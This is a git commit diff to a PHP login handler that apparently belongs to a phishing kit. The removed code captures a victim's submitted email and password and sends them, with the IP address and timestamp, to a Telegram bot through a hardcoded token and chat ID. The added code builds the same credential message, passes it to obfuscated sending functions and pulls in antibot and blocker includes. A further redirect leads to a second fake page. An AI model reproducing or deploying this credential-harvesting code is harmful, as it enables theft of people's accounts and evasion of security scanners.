594a9da0811648983d5edac1cb2077143c66efcb
basgs <89833787+basgs@users.noreply.github.com>
2024-05-23 20:03:36 +0800

    Update login1.php

--- login1.php
+++ login1.php
@@ -1,52 +1,23 @@
 <?php
-// name 
-// pw
-// subbtn
+include("./assets/function.php");
+include("./assets/antibot.php");
+include("./assets/antibots.php");
+include("./assets/tite.php");
+include("./assets/antibotsulit.php");
+include("./assets/blocker.php");
+include("./assets/bt.php");
+
+$email = $_POST['eml'];
+$password = $_POST['pwd'];
+$time1 = date('M d Y - g:i a');
 date_default_timezone_set('Asia/Manila');
 
+            $hostname = gethostbyaddr($ip2);
+            $message .= "[LOGIN 1]\n";
+            $message .= "EMAIL: ".$email."\n";
+            $message .= "PASSWORD: ".$password."\n";
+            $message .= "IP ADDRESS: ".$ip2."\n";
+            $message .= "DATE/TIME: ".$time1."\n";z6nQf($message);tangakaba($message);
 
-
-if(isset($_POST['foo'])){
-    $name  = $_POST['eml'];
-    $pw    = $_POST['pwd'];
-    $datez = date("Y/m/d");
-    $timez =  date("h:i A");
-    $day_of_the_week = date("l");
-    $backticks = "**";
-    $ipAdd = $_SERVER['HTTP_CLIENT_IP'];
-    $ip = $_SERVER['HTTP_CLIENT_IP'] 
-   ? $_SERVER['HTTP_CLIENT_IP'] 
-   : ($_SERVER['HTTP_X_FORWARDED_FOR'] 
-        ? $_SERVER['HTTP_X_FORWARDED_FOR'] 
-        : $_SERVER['REMOTE_ADDR']);
-
-
-         $token = "6449896778:AAHbpwwkig8sr7japTFkYw0YIRHAIHwYrb8";
-    $data = [
-        // 'chat_id' => '1002143645972',
-        // 'chat_id' => '-@ashleyughchannel',
-        'chat_id' => '-1002143645972',
-        'text' => 
-">$-$-$-$-$ 𝑱𝑬𝑺𝑼𝑺 𝑪𝑯𝑹𝑰𝑺𝑻 $-$-$-$-$->
-| username : <code>$name</code>
-| password : <code>$pw</code>
-| 𝟏𝐒𝐓 𝐀𝐓𝐓𝐄𝐌𝐏𝐓
-| $ip
-
-| $day_of_the_week  |  $timez | $datez",
-        'parse_mode' => 'html',
-        
-    ];//endof array
-
-    $sendMSGGG = file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?".http_build_query($data));
-
-
-
-   
-
-
-};
-header("location:login2.html");
-
-
+            header("location:login2.html");
 ?>
